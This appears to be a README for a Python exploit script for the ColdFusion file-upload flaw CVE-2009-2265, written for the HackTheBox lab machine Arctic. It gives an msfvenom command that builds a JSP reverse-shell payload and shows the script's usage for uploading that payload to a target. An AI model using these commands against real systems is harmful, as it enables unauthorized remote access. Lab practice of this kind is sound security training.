# zaphoxx-coldfusion
coldfusion exploit based on https://cvedetails.com/cve/CVE-2009-2265/

The main reason I setup a python script for this particular cve was that the metasploit version of the same did not work for me when I tried to solve the HTB machine Arctic. Also it was nice to get some little python pratice. However there is another python version of that same exploit around which was originally created by Alexander Reid if you prefer to use his version.

Usage is pretty simple:

Make sure you have a payload file created 

e.g. using msfvenom:
`msfvenom -p java/jsp_shell_reverse_tcp -f raw LHOST=<yourip> LPORT=<yourport> -o shell.jsp`

usage: `python3 2265.py [-h] -t TARGET [-p PORT] [-f FILEPATH] [-b BASEPATH]`

   `usage: 2265.py [-h] -t TARGET [-p PORT] [-f FILEPATH] [-b BASEPATH]`
   
optional arguments:
  
  `-h, --help   show this help message and exit`
  
  `-t TARGET    target ip`
  
  `-p PORT      target port`
  
  `-f FILEPATH  path of file with shellcode to upload`
  
  `-b BASEPATH  coldfusion basepath`


